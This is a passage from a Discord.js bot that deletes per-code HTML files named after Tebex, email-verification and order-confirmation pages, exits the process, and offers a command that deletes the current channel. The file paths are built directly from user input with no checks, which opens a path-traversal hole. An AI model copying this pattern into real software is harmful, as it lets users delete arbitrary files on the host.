  fs.unlinkSync(`badlion/claim/tebex${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`badlion/claim/email-verif${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`badlion/claim/order-conf${interaction.options.getString('code')}.html`)
  interaction.reply({ embeds: [delEmbed] })

  setTimeout(() => {
    process.exit();
  }, 2000)
}
})

client.on('interactionCreate', (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'terminate-session'){

    const { guild, member, options } = interaction

    interaction.channel.delete();
  }})



client.login(process.env.TOKEN);